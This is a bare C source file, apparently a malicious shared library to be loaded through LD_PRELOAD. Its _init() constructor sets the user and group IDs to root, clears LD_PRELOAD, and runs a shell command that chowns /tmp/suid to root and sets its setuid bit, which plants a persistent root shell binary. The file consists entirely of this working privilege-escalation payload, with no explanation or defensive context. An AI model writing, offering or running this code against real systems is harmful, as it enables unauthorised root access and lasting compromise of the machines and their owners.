#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init()
{
 setgid(0);
 setuid(0);
 unsetenv("LD_PRELOAD");
 execl("/bin/sh","sh","-c","chown root:root /tmp/suid; chmod +s /tmp/suid",NULL);
}
